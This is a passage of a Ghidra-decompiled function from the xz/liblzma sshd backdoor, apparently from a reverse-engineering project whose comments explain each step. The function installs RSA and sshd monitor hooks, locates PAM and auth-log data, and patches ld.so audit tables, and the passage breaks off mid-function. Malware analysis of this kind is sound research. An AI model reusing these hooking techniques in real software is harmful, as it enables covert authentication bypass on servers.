// /home/kali/xzre-ghidra/xzregh/105830_backdoor_install_runtime_hooks.c
// Function: backdoor_install_runtime_hooks @ 0x105830
// Calling convention: __stdcall
// Prototype: BOOL __stdcall backdoor_install_runtime_hooks(backdoor_setup_params_t * params)


/*
 * AutoDoc: Loader workhorse that performs every runtime retrofit. After confirming the resolver-frame/cpuid GOT distance it zeroes a stack `backdoor_data_t`, parses `_r_debug` with `main_elf_resolve_stack_end_if_sshd` + `scan_shared_libraries_via_r_debug`, snaps the active liblzma allocator, and repopulates the hooks blob/shared globals from liblzma. It refreshes sshd string references, dissects the mm_request/mm_answer ranges to locate the auth-log format, PAM flag, and PermitRootLogin toggles, runs the sensitive-data + monitor heuristics, and harvests the sshlogv handlers from `syslog_bad_level`. Once libc/libcrypto imports and the secret-data telemetry hit their expected counts it streams every hook/trampoline pointer into `secret_data`, flips the `_dl_audit` bitmasks, installs the symbind trampoline, and restores the liblzma allocator; failures reset the ld.so ctx and zero the cpuid GOT bookkeeping so glibc's resolver can keep running untouched.
 */

#include "xzre_types.h"

BOOL backdoor_install_runtime_hooks(backdoor_setup_params_t *params)

{
  global_context_t *ctx;
  imported_funcs_t *imported_funcs;
  audit_ifaces *audit_ifaces_slot_ptr;
  elf_handles_t *elf_handles;
  uint log_literal_slot;
  u32 auditstate_snapshot;
  u64 *resolver_frame_addr;
  u64 *cpuid_got_entry;
  backdoor_hooks_ctx_t *hooks_ctx_ptr;
  backdoor_hooks_data_t **hooks_data_slot;
  u64 signed_payload_size;
  pfn_RSA_get0_key_t rsa_get0_key_hook_ptr;
  pfn_EVP_PKEY_set1_RSA_t evp_set1_rsa_hook_ptr;
  sshd_monitor_func_t keyverify_hook_entry;
  elf_symbol_get_addr_fn sym_resolver;
  Elf64_Addr symbol_rva;
  Elf64_Ehdr *symbol_module_ehdr;
  sshd_ctx_t *live_sshd_ctx;
  byte *audit_slot_byte;
  u32 *cpuid_leaf_ptr;
  u32 cpuid_edx;
  u32 cpuid_ebx;
  u32 cpuid_ecx;
  u8 scratch_reg_index;
  elf_info_t *elf_info;
  BOOL relr_retry_flag;
  EncodedStringId string_id;
  BOOL probe_success;
  void *text_segment;
  lzma_allocator *libc_allocator;
  pfn_malloc_usable_size_t malloc_usable_size_stub;
  lzma_allocator *libcrypto_allocator;
  elf_info_t *search_image;
  pfn_EVP_MD_CTX_new_t evp_md_ctx_new_alloc;
  void *data_segment;
  elf_functions_t *elf_functions_table;
  pfn_BN_free_t bn_free_stub;
  Elf64_Sym *bn_bin2bn_symbol;
  char *string_cursor;
  pfn_BN_bn2bin_t bn_bn2bin_stub;
  Elf64_Sym *libcrypto_symbol;
  Elf64_Sym *rsa_free_symbol;
  pfn_RSA_set0_key_t rsa_set0_key_stub;
  Elf64_Sym *rsa_sign_symbol;
  u8 *authprobe_func_end;
  Elf64_Rela *mem_address;
  int *auth_log_reloc;
  log_handler_fn *log_handler_tmp_ptr;
  log_handler_fn *main_data_base;
  long loop_idx;
  log_handler_fn *log_handler_slot_tmp;
  u32 *resolved_count_ptr;
  Elf64_Ehdr *string_begin;
  log_handler_fn *log_handler_slot_candidate;
  backdoor_data_t *backdoor_data_zero_cursor;
  elf_entry_ctx_t *entry_ctx_ptr;
  global_context_t *global_ctx_cursor;
  backdoor_hooks_data_t *hooks_data_cursor;
  sshd_ctx_t *sshd_ctx_cursor;
  sshd_log_ctx_t *sshd_log_ctx_ptr;
  imported_funcs_t *imported_funcs_cursor;
  dasm_ctx_t *decode_ctx_cursor;
  audit_ifaces *audit_ifaces_zero_cursor;
  u8 mov_src_reg;
  u8 mov_dst_reg;
  u8 *scan_cursor;
  sshd_monitor_func_t *authprobe_func_start;
  int auth_root_vote_count;
  log_handler_fn *log_handler_ctx_candidate;
  u8 wipe_stride;
  string_references_t string_refs;
  backdoor_shared_libraries_data_t shared_maps;
  backdoor_data_t backdoor_data;
  backdoor_hooks_data_t *hooks;
  global_context_t *global_ctx;
  u8 *syslog_bad_level_cursor;
  log_handler_fn *validated_log_handler;
  backdoor_hooks_data_t *hooks_data;
  EncodedStringId string_id_cursor;
  ptrdiff_t link_map_delta;
  pfn_RSA_public_decrypt_t *rsa_public_decrypt_slot;
  pfn_EVP_PKEY_set1_RSA_t *evp_set1_rsa_slot;
  pfn_RSA_get0_key_t *rsa_get0_key_slot;
  void *libc_stack_end_slot;
  u64 liblzma_text_size;
  u64 literal_probe_slot;
  u64 literal_scan_slot;
  main_elf_t main_elf_ctx;
  u64 *resolver_frame_snapshot;
  backdoor_shared_libraries_data_t shared_maps_args;
  dasm_ctx_t syslog_dasm_ctx;
  dasm_ctx_t probe_dasm_ctx;
  backdoor_data_t loader_data;
  
  wipe_stride = 0;
  string_id_cursor = 0;
  backdoor_data_zero_cursor = &loader_data;
  // AutoDoc: Wipe the stack-resident `backdoor_data_t` so every elf handle, link_map slot, and scratch struct starts from zero.
  for (loop_idx = 0x256; loop_idx != 0; loop_idx = loop_idx + -1) {
    *(u32 *)&backdoor_data_zero_cursor->sshd_link_map = 0;
    backdoor_data_zero_cursor = (backdoor_data_t *)((long)&backdoor_data_zero_cursor->sshd_link_map + 4);
  }
  elf_handles = &loader_data.elf_handles;
  loader_data.elf_handles.ldso = &loader_data.dynamic_linker_info;
  loader_data.elf_handles.libc = &loader_data.libc_info;
  link_map_delta = 0;
  rsa_public_decrypt_slot = (pfn_RSA_public_decrypt_t *)0x0;
  evp_set1_rsa_slot = (pfn_EVP_PKEY_set1_RSA_t *)0x0;
  rsa_get0_key_slot = (pfn_RSA_get0_key_t *)0x0;
  libc_stack_end_slot = (void *)0x0;
  entry_ctx_ptr = params->entry_ctx;
  loader_data.elf_handles.liblzma = &loader_data.liblzma_info;
  loader_data.elf_handles.libcrypto = &loader_data.libcrypto_info;
  loader_data.elf_handles.sshd = &loader_data.main_info;
  loader_data.data_handle.runtime_data = &loader_data;
  loader_data.data_handle.cached_elf_handles = elf_handles;
  resolve_gotplt_base_from_tls_get_addr(entry_ctx_ptr);
  text_segment = (entry_ctx_ptr->got_ctx).tls_got_entry;
  if (text_segment != (void *)0x0) {
    resolver_frame_addr = *(u64 **)((long)text_segment + (entry_ctx_ptr->got_ctx).cpuid_slot_index * 8 + 0x18);
    cpuid_got_entry = entry_ctx_ptr->resolver_frame;
    loop_idx = (long)cpuid_got_entry - (long)resolver_frame_addr;
    if (cpuid_got_entry <= resolver_frame_addr) {
      loop_idx = (long)resolver_frame_addr - (long)cpuid_got_entry;
    }
    // AutoDoc: Sanity-check that the resolver frame and cpuid GOT slot live near each other; otherwise abort before touching an unrelated GOT entry.
    if (loop_idx < 0x50001) {
      string_begin = (Elf64_Ehdr *)((ulong)resolver_frame_addr & 0xfffffffffffff000);
      symbol_module_ehdr = string_begin + -0x800;
LAB_00105951:
      string_id = encoded_string_id_lookup((char *)string_begin,(char *)0x0);
      if (string_id != STR_ELF) goto code_r0x00105962;
      main_elf_ctx.libc_stack_end_slot = &libc_stack_end_slot;
      resolver_frame_snapshot = params->entry_ctx->resolver_frame;
      main_elf_ctx.elf_handles = elf_handles;
      main_elf_ctx.ldso_ehdr = string_begin;
      probe_success = main_elf_resolve_stack_end_if_sshd(&main_elf_ctx);
      if (probe_success != FALSE) {
        loader_data.active_lzma_allocator = get_fake_lzma_allocator();
        loop_idx = 0;
        do {
          *(u8 *)((long)&loader_data.saved_lzma_allocator.alloc + loop_idx) =
               *(u8 *)((long)&(loader_data.active_lzma_allocator)->alloc + loop_idx);
          loop_idx = loop_idx + 1;
        } while (loop_idx != 0x18);
        shared_maps_args.rsa_public_decrypt_slot = &rsa_public_decrypt_slot;
        shared_maps_args.evp_set1_rsa_slot = &evp_set1_rsa_slot;
        shared_maps_args.rsa_get0_key_slot = &rsa_get0_key_slot;
        shared_maps_args.hooks_data_slot = params->hook_ctx->hooks_data_slot_ptr;
        shared_maps_args.shared_maps = &loader_data;
        shared_maps_args.elf_handles = elf_handles;
        shared_maps_args.libc_imports = &loader_data.libc_imports;
        // AutoDoc: Walk `_r_debug` to populate the live module handles and capture the hook entries that will later be written back into liblzma.
        probe_success = scan_shared_libraries_via_r_debug(&shared_maps_args);
        if (probe_success == FALSE) goto LAB_00105a59;
        hooks_data = *params->hook_ctx->hooks_data_slot_ptr;
        ctx = &hooks_data->global_ctx;
        imported_funcs = &hooks_data->imported_funcs;
        global_ctx_cursor = ctx;
        // AutoDoc: Zero `hooks_data->global_ctx` so the runtime state starts from a clean slate before we publish pointers and flags.
        for (loop_idx = 0x5a; loop_idx != 0; loop_idx = loop_idx + -1) {
          global_ctx_cursor->uses_endbr64 = FALSE;
          global_ctx_cursor = (global_context_t *)((long)global_ctx_cursor + 4);
        }
        (hooks_data->global_ctx).sshd_log_ctx = &hooks_data->sshd_log_ctx;
        hooks_ctx_ptr = params->hook_ctx;
        (hooks_data->global_ctx).imported_funcs = imported_funcs;
        (hooks_data->global_ctx).sshd_ctx = &hooks_data->sshd_ctx;
        hooks_data_slot = hooks_ctx_ptr->hooks_data_slot_ptr;
        (hooks_data->global_ctx).libc_imports = &hooks_data->libc_imports;
        hooks_data_cursor = *hooks_data_slot;
        signed_payload_size = hooks_data_cursor->signed_data_size;
        (hooks_data->global_ctx).payload_bytes_buffered = 0;
        (hooks_data->global_ctx).payload_buffer = &hooks_data_cursor->signed_data;
        (hooks_data->global_ctx).payload_buffer_size = signed_payload_size;
        elf_build_string_xref_table(&loader_data.main_info,&loader_data.sshd_string_refs);
        liblzma_text_size = 0;
        text_segment = elf_get_text_segment(loader_data.elf_handles.liblzma,&liblzma_text_size);
        if (text_segment != (void *)0x0) {
          (hooks_data->global_ctx).liblzma_text_start = text_segment;
          (hooks_data->global_ctx).liblzma_text_end = (void *)((long)text_segment + liblzma_text_size);
          hooks_data_cursor = hooks_data;
          // AutoDoc: Clear `hooks_data->ldso_ctx` so every audit pointer/bitmask starts NULL before `resolve_ldso_audit_offsets()` populates them.
          for (loop_idx = 0x4e; loop_idx != 0; loop_idx = loop_idx + -1) {
            (hooks_data_cursor->ldso_ctx).libcrypto_basename_buf[0] = '\0';
            (hooks_data_cursor->ldso_ctx).libcrypto_basename_buf[1] = '\0';
            (hooks_data_cursor->ldso_ctx).libcrypto_basename_buf[2] = '\0';
            (hooks_data_cursor->ldso_ctx).libcrypto_basename_buf[3] = '\0';
            hooks_data_cursor = (backdoor_hooks_data_t *)((long)hooks_data_cursor + 4);
          }
          hooks_ctx_ptr = params->hook_ctx;
          (hooks_data->ldso_ctx).imported_funcs = imported_funcs;
          rsa_get0_key_hook_ptr = hooks_ctx_ptr->rsa_get0_key_entry;
          (hooks_data->ldso_ctx).rsa_public_decrypt_backdoor_shim = hooks_ctx_ptr->rsa_public_decrypt_entry;
          evp_set1_rsa_hook_ptr = params->shared_globals->evp_set1_rsa_hook_entry;
          (hooks_data->ldso_ctx).rsa_get0_key_backdoor_shim = rsa_get0_key_hook_ptr;
          (hooks_data->ldso_ctx).evp_pkey_set1_rsa_backdoor_shim = evp_set1_rsa_hook_ptr;
          sshd_ctx_cursor = &hooks_data->sshd_ctx;
          // AutoDoc: Wipe `hooks_data->sshd_ctx` so every monitor-hook pointer and scratch slot starts at zero before we seed the hook entries.
          for (loop_idx = 0x38; loop_idx != 0; loop_idx = loop_idx + -1) {
            sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
            sshd_ctx_cursor = (sshd_ctx_t *)((long)sshd_ctx_cursor + 4);
          }
          (hooks_data->sshd_ctx).mm_answer_authpassword_send_reply_hook =
               params->shared_globals->authpassword_hook_entry;
          keyverify_hook_entry = params->hook_ctx->mm_answer_keyverify_entry;
          (hooks_data->sshd_ctx).mm_answer_keyallowed_payload_dispatch_hook =
               params->hook_ctx->mm_answer_keyallowed_entry;
          (hooks_data->sshd_ctx).mm_answer_keyverify_send_staged_reply_hook = keyverify_hook_entry;
          sshd_log_ctx_ptr = &hooks_data->sshd_log_ctx;
          // AutoDoc: Zero `hooks_data->sshd_log_ctx` so the log shim starts disabled and without cached handler pointers.
          for (loop_idx = 0x1a; loop_idx != 0; loop_idx = loop_idx + -1) {
            sshd_log_ctx_ptr->log_squelched = FALSE;
            sshd_log_ctx_ptr = (sshd_log_ctx_t *)((long)sshd_log_ctx_ptr + 4);
          }
          (hooks_data->sshd_log_ctx).log_hook_entry = params->hook_ctx->mm_log_handler_entry;
          *params->shared_globals->global_ctx_slot = ctx;
          imported_funcs_cursor = imported_funcs;
          // AutoDoc: Clear `hooks_data->imported_funcs` so the later import resolution can count and publish stubs deterministically.
          for (loop_idx = 0x4a; loop_idx != 0; loop_idx = loop_idx + -1) {
            *(u32 *)&imported_funcs_cursor->RSA_public_decrypt_orig = 0;
            imported_funcs_cursor = (imported_funcs_t *)((long)imported_funcs_cursor + 4);
          }
          (hooks_data->imported_funcs).RSA_public_decrypt_plt = rsa_public_decrypt_slot;
          (hooks_data->imported_funcs).EVP_PKEY_set1_RSA_plt = evp_set1_rsa_slot;
          (hooks_data->imported_funcs).RSA_get0_key_plt = rsa_get0_key_slot;
          loop_idx = 0;
          do {
            (hooks_data->sshd_log_ctx).reserved_alignment[loop_idx + -0x7c] =
                 *(u8 *)((long)&loader_data.libc_imports.resolved_imports_count + loop_idx);
            loop_idx = loop_idx + 1;
          } while (loop_idx != 0x70);
          (hooks_data->imported_funcs).libc = &hooks_data->libc_imports;
          (hooks_data->libc_imports).__libc_stack_end = libc_stack_end_slot;
          libc_allocator = get_fake_lzma_allocator();
          libc_allocator->opaque = loader_data.elf_handles.libc;
          // AutoDoc: Carve a fake `malloc_usable_size` stub inside liblzma's allocator arena so the shim can observe libc's import tally without calling real libc.
          malloc_usable_size_stub = (pfn_malloc_usable_size_t)lzma_alloc(0x440,libc_allocator);
          (hooks_data->libc_imports).malloc_usable_size = malloc_usable_size_stub;
          if (malloc_usable_size_stub != (pfn_malloc_usable_size_t)0x0) {
            (hooks_data->libc_imports).resolved_imports_count =
                 (hooks_data->libc_imports).resolved_imports_count + 1;
          }
          // AutoDoc: Resolve `_dl_audit*` metadata plus the `link_map` displacement before patching ld.so’s audit tables.
          probe_success = resolve_ldso_audit_offsets
                             (&loader_data.data_handle,&link_map_delta,hooks_data,imported_funcs);
          if (probe_success == FALSE) goto LAB_00105a60;
          libcrypto_allocator = get_fake_lzma_allocator();
          libcrypto_allocator->opaque = loader_data.elf_handles.libcrypto;
          search_image = loader_data.elf_handles.libcrypto;
          if (loader_data.elf_handles.libcrypto != (elf_info_t *)0x0) {
            search_image = (elf_info_t *)
                      elf_gnu_hash_lookup_symbol(loader_data.elf_handles.libcrypto,STR_RSA_get0_key,0)
            ;
            evp_md_ctx_new_alloc = (pfn_EVP_MD_CTX_new_t)lzma_alloc(0xaf8,libcrypto_allocator);
            (hooks_data->imported_funcs).EVP_MD_CTX_new = evp_md_ctx_new_alloc;
            if (evp_md_ctx_new_alloc != (pfn_EVP_MD_CTX_new_t)0x0) {
              resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
            }
          }
          elf_info = loader_data.elf_handles.sshd;
          syslog_dasm_ctx.instruction = (u8 *)0x0;
          probe_dasm_ctx.instruction = (u8 *)0x0;
          text_segment = elf_get_text_segment(loader_data.elf_handles.sshd,(u64 *)&syslog_dasm_ctx);
          scan_cursor = syslog_dasm_ctx.instruction + (long)text_segment;
          data_segment = elf_get_writable_tail_span(elf_info,(u64 *)&probe_dasm_ctx,FALSE);
          (hooks_data->global_ctx).sshd_text_start = text_segment;
          (hooks_data->global_ctx).sshd_text_end = scan_cursor;
          (hooks_data->global_ctx).sshd_data_start = data_segment;
          (hooks_data->global_ctx).sshd_data_end = probe_dasm_ctx.instruction + (long)data_segment;
          elf_functions_table = get_elf_functions_table();
          if (((elf_functions_table == (elf_functions_t *)0x0) ||
              (sym_resolver = elf_functions_table->elf_gnu_hash_lookup_symbol_addr,
              sym_resolver == (elf_symbol_get_addr_fn)0x0)) ||
             (elf_functions_table->elf_info_parse == (elf_parse_fn)0x0)) goto LAB_00105a60;
          bn_bin2bn_symbol = (Elf64_Sym *)0x0;
          bn_free_stub = (pfn_BN_free_t)(*sym_resolver)(loader_data.elf_handles.libcrypto,STR_BN_free);
          (hooks_data->imported_funcs).BN_free = bn_free_stub;
          if (bn_free_stub != (pfn_BN_free_t)0x0) {
            bn_bin2bn_symbol = elf_gnu_hash_lookup_symbol(loader_data.elf_handles.libcrypto,STR_BN_bin2bn,0);
          }
          string_id_cursor = STR_ssh_rsa_cert_v01_openssh_com;
          string_cursor = elf_find_encoded_string_in_rodata
                              (loader_data.elf_handles.sshd,&string_id_cursor,(void *)0x0);
          (hooks_data->global_ctx).ssh_rsa_cert_alg = string_cursor;
          if (string_cursor == (char *)0x0) goto LAB_00105a60;
          string_id_cursor = STR_rsa_sha2_256;
          string_cursor = elf_find_encoded_string_in_rodata
                              (loader_data.elf_handles.sshd,&string_id_cursor,(void *)0x0);
          (hooks_data->global_ctx).rsa_sha2_256_alg = string_cursor;
          if (string_cursor == (char *)0x0) goto LAB_00105a60;
          libcrypto_symbol = (Elf64_Sym *)0x0;
          bn_bn2bin_stub = (pfn_BN_bn2bin_t)
                    elf_gnu_hash_lookup_symbol_addr(loader_data.elf_handles.libcrypto,STR_BN_bn2bin);
          (hooks_data->imported_funcs).BN_bn2bin = bn_bn2bin_stub;
          if (bn_bn2bin_stub != (pfn_BN_bn2bin_t)0x0) {
            libcrypto_symbol = elf_gnu_hash_lookup_symbol(loader_data.elf_handles.libcrypto,STR_BN_dup,0);
            if (libcrypto_symbol != (Elf64_Sym *)0x0) {
              symbol_rva = libcrypto_symbol->st_value;
              symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
              resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
              (hooks_data->imported_funcs).BN_dup = (pfn_BN_dup_t)(symbol_module_ehdr->e_ident + symbol_rva);
            }
            libcrypto_symbol = elf_gnu_hash_lookup_symbol(loader_data.elf_handles.libcrypto,STR_RSA_new,0);
            if ((hooks_data->imported_funcs).BN_free != (pfn_BN_free_t)0x0) {
              resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
            }
          }
          rsa_free_symbol = elf_gnu_hash_lookup_symbol(loader_data.elf_handles.libcrypto,STR_RSA_free,0);
          rsa_set0_key_stub = (pfn_RSA_set0_key_t)(*sym_resolver)(loader_data.elf_handles.libcrypto,STR_RSA_set0_key)
          ;
          rsa_sign_symbol = (Elf64_Sym *)0x0;
          (hooks_data->imported_funcs).RSA_set0_key = rsa_set0_key_stub;
          if (rsa_set0_key_stub != (pfn_RSA_set0_key_t)0x0) {
            resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            rsa_sign_symbol = elf_gnu_hash_lookup_symbol(loader_data.elf_handles.libcrypto,STR_RSA_sign,0);
            if (search_image != (elf_info_t *)0x0) {
              symbol_rva = search_image->load_base_vaddr;
              symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
              resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
              (hooks_data->imported_funcs).RSA_get0_key_resolved =
                   (pfn_RSA_get0_key_t)(symbol_module_ehdr->e_ident + symbol_rva);
            }
          }
          if ((hooks_data->imported_funcs).BN_bn2bin != (pfn_BN_bn2bin_t)0x0) {
            resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
          }
          // AutoDoc: Score sshd’s sensitive-data heuristics so the payload handlers know where to read/write secrets.
          probe_success = sshd_recon_bootstrap_sensitive_data
                             (loader_data.elf_handles.sshd,loader_data.elf_handles.libcrypto,
                              &loader_data.sshd_string_refs,imported_funcs,ctx);
          if (probe_success == FALSE) goto LAB_00105a60;
          if (bn_bin2bn_symbol != (Elf64_Sym *)0x0) {
            symbol_rva = bn_bin2bn_symbol->st_value;
            symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (hooks_data->imported_funcs).BN_bin2bn = (pfn_BN_bin2bn_t)(symbol_module_ehdr->e_ident + symbol_rva);
          }
          if (libcrypto_symbol != (Elf64_Sym *)0x0) {
            symbol_rva = libcrypto_symbol->st_value;
            symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (hooks_data->imported_funcs).RSA_new = (pfn_RSA_new_t)(symbol_module_ehdr->e_ident + symbol_rva);
          }
          if (rsa_free_symbol != (Elf64_Sym *)0x0) {
            symbol_rva = rsa_free_symbol->st_value;
            symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (hooks_data->imported_funcs).RSA_free = (pfn_RSA_free_t)(symbol_module_ehdr->e_ident + symbol_rva);
          }
          if (rsa_sign_symbol != (Elf64_Sym *)0x0) {
            symbol_rva = rsa_sign_symbol->st_value;
            symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (hooks_data->imported_funcs).RSA_sign = (pfn_RSA_sign_t)(symbol_module_ehdr->e_ident + symbol_rva);
          }
          bn_bin2bn_symbol = elf_gnu_hash_lookup_symbol
                              (loader_data.elf_handles.libcrypto,STR_EVP_DecryptUpdate,0);
          search_image = loader_data.elf_handles.sshd;
          sshd_ctx_cursor = (hooks_data->global_ctx).sshd_ctx;
          syslog_dasm_ctx.instruction = (u8 *)0x0;
          literal_probe_slot = literal_probe_slot & 0xffffffff00000000;
          sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
          sshd_ctx_cursor->have_mm_answer_authpassword = FALSE;
          sshd_ctx_cursor->have_mm_answer_keyverify = FALSE;
          text_segment = elf_get_writable_tail_span(loader_data.elf_handles.sshd,(u64 *)&syslog_dasm_ctx,FALSE);
          scan_cursor = syslog_dasm_ctx.instruction;
          if ((text_segment != (void *)0x0) &&
             (loader_data.sshd_string_refs.mm_request_send.func_start != (void *)0x0)) {
            // AutoDoc: Seed the `mm_request_send` bounds from the cached string references so the privsep dispatcher we fingerprinted earlier becomes available to the monitor hooks without another scan.
            sshd_ctx_cursor->mm_request_send_start = loader_data.sshd_string_refs.mm_request_send.func_start;
            sshd_ctx_cursor->mm_request_send_end = loader_data.sshd_string_refs.mm_request_send.func_end;
            literal_probe_slot = CONCAT44(*(uint *)((u8 *)&literal_probe_slot + 4),0x400);
            string_cursor = elf_find_encoded_string_in_rodata
                                (search_image,(EncodedStringId *)&literal_probe_slot,(void *)0x0);
            // AutoDoc: Cache the "without password" literal pointer so the log shim can spot authpassword prompts without rescanning `.rodata`.
            sshd_ctx_cursor->STR_without_password = string_cursor;
            if ((string_cursor != (char *)0x0) &&
               (probe_success = elf_find_function_ptr_slot
                                   (XREF_mm_answer_authpassword,
                                    &sshd_ctx_cursor->mm_answer_authpassword_start,
                                    &sshd_ctx_cursor->mm_answer_authpassword_end,
                                    &sshd_ctx_cursor->mm_answer_authpassword_slot,search_image,
                                    &loader_data.sshd_string_refs,ctx), probe_success == FALSE)) {
              sshd_ctx_cursor->mm_answer_authpassword_start = (sshd_monitor_func_t *)0x0;
              sshd_ctx_cursor->mm_answer_authpassword_end = (void *)0x0;
              sshd_ctx_cursor->mm_answer_authpassword_slot = (sshd_monitor_func_t *)0x0;
            }
            literal_probe_slot = CONCAT44(*(uint *)((u8 *)&literal_probe_slot + 4),0x7b8);
            string_cursor = elf_find_encoded_string_in_rodata
                                (search_image,(EncodedStringId *)&literal_probe_slot,(void *)0x0);
            // AutoDoc: Record the publickey literal once so the KEYALLOWED/KEYVERIFY hooks can reuse it when massaging monitor replies.
            sshd_ctx_cursor->STR_publickey = string_cursor;
            if (string_cursor != (char *)0x0) {
              probe_success = elf_find_function_ptr_slot
                                 (XREF_mm_answer_keyallowed,&sshd_ctx_cursor->mm_answer_keyallowed_start,
                                  &sshd_ctx_cursor->mm_answer_keyallowed_end,
                                  &sshd_ctx_cursor->mm_answer_keyallowed_slot,search_image,
                                  &loader_data.sshd_string_refs,ctx);
              if (probe_success == FALSE) {
                sshd_ctx_cursor->mm_answer_keyallowed_start = (sshd_monitor_func_t *)0x0;
                sshd_ctx_cursor->mm_answer_keyallowed_end = (void *)0x0;
                sshd_ctx_cursor->mm_answer_keyallowed_slot = (sshd_monitor_func_t *)0x0;
              }
              else {
                probe_success = elf_find_function_ptr_slot
                                   (XREF_mm_answer_keyverify,&sshd_ctx_cursor->mm_answer_keyverify_start,
                                    &sshd_ctx_cursor->mm_answer_keyverify_end,
                                    &sshd_ctx_cursor->mm_answer_keyverify_slot,search_image,
                                    &loader_data.sshd_string_refs,ctx);
                if (probe_success == FALSE) {
                  sshd_ctx_cursor->mm_answer_keyverify_start = (sshd_monitor_func_t *)0x0;
                  sshd_ctx_cursor->mm_answer_keyverify_end = (void *)0x0;
                  sshd_ctx_cursor->mm_answer_keyverify_slot = (sshd_monitor_func_t *)0x0;
                }
              }
            }
            // AutoDoc: Only start the relocation hunt after at least one monitor handler resolves; the ensuing scan lines up their shared format literal so we know exactly which relocation slot to patch.
            if ((sshd_ctx_cursor->mm_answer_authpassword_start != (sshd_monitor_func_t *)0x0) ||
               (sshd_ctx_cursor->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0)) {
              live_sshd_ctx = (hooks_data->global_ctx).sshd_ctx;
              probe_dasm_ctx.instruction = (u8 *)0x0;
              authprobe_func_start = live_sshd_ctx->mm_answer_authpassword_start;
              if (authprobe_func_start == (sshd_monitor_func_t *)0x0) {
                authprobe_func_start = live_sshd_ctx->mm_answer_keyallowed_start;
                if (authprobe_func_start == (sshd_monitor_func_t *)0x0) goto LAB_001065af;
                authprobe_func_end = (u8 *)live_sshd_ctx->mm_answer_keyallowed_end;
              }
              else {
                authprobe_func_end = (u8 *)live_sshd_ctx->mm_answer_authpassword_end;
              }
              scratch_reg_index = FALSE;
              string_cursor = (char *)0x0;
              // AutoDoc: Walk every relocation that references EncodedStringId 0x198 (the shared auth-log literal) so mm_answer_authpassword/keyallowed can be paired with the pointer we later rewrite.
              literal_scan_slot = CONCAT44(*(uint *)((u8 *)&literal_scan_slot + 4),0x198);
              while (string_cursor = elf_find_encoded_string_in_rodata
                                         (search_image,(EncodedStringId *)&literal_scan_slot,string_cursor),
                    string_cursor != (char *)0x0) {
                probe_dasm_ctx.instruction = (u8 *)0x0;
                mem_address = elf_rela_find_relative_slot
                                        (search_image,string_cursor,(u8 *)0x0,(u8 *)0x0,(ulong *)&probe_dasm_ctx);
                if (mem_address == (Elf64_Rela *)0x0) {
                  probe_dasm_ctx.instruction = (u8 *)0x0;
                  scratch_reg_index = TRUE;
                  mem_address = (Elf64_Rela *)
                                elf_relr_find_relative_slot
                                          (search_image,string_cursor,(u8 *)0x0,(u8 *)0x0,(ulong *)&probe_dasm_ctx);
                }
                while (mem_address != (Elf64_Rela *)0x0) {
                  do {
                    probe_success = elf_vaddr_range_in_relro_if_required(search_image,(u64)mem_address,8,TRUE);
                    if ((probe_success != FALSE) &&
                       (probe_success = find_riprel_opcode_memref_ex
                                           ((u8 *)authprobe_func_start,authprobe_func_end,(dasm_ctx_t *)0x0,
                                            X86_OPCODE_1B_MOV_STORE,mem_address), probe_success != FALSE))
                    {
                      authprobe_func_start = sshd_ctx_cursor->mm_answer_authpassword_start;
                      // AutoDoc: Pinpoint the shared auth-log format relocation pulled from mm_answer_* so later hooks can rewrite the literal in-place without rescanning the function.
                      ((hooks_data->global_ctx).sshd_ctx)->auth_log_fmt_reloc = (char *)mem_address;
                      if (authprobe_func_start != (sshd_monitor_func_t *)0x0) {
                        sshd_ctx_cursor->have_mm_answer_authpassword = TRUE;
                      }
                      if ((sshd_ctx_cursor->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0) &&
                         (sshd_ctx_cursor->have_mm_answer_keyallowed = TRUE,
                         sshd_ctx_cursor->mm_answer_keyverify_start != (sshd_monitor_func_t *)0x0)) {
                        sshd_ctx_cursor->have_mm_answer_keyverify = TRUE;
                      }
                      auth_log_reloc = (int *)find_riprel_mov_load_target_in_range
                                                 (XREF_start_pam,&loader_data.sshd_string_refs,text_segment
                                                  ,scan_cursor + (long)text_segment);
                      if (auth_log_reloc != (int *)0x0) {
                        // AutoDoc: Remember sshd's `use_pam` flag pointer so the monitor hooks can keep PAM-enabled builds aligned with the daemon's configuration.
                        ((hooks_data->global_ctx).sshd_ctx)->use_pam_ptr = auth_log_reloc;
                      }
                      decode_ctx_cursor = &probe_dasm_ctx;
                      scratch_reg_index = FALSE;
                      *(uint *)&probe_dasm_ctx.instruction_size = 0x70;
                      probe_dasm_ctx.instruction = (u8 *)0xc5800000948;
                      goto LAB_00106471;
                    }
                    if (scratch_reg_index) goto LAB_001063c8;
                    mem_address = elf_rela_find_relative_slot
                                            (search_image,string_cursor,(u8 *)0x0,(u8 *)0x0,(ulong *)&probe_dasm_ctx
                                            );
                  } while (mem_address != (Elf64_Rela *)0x0);
                  probe_dasm_ctx.instruction = (u8 *)0x0;
LAB_001063c8:
                  mem_address = (Elf64_Rela *)
                                elf_relr_find_relative_slot
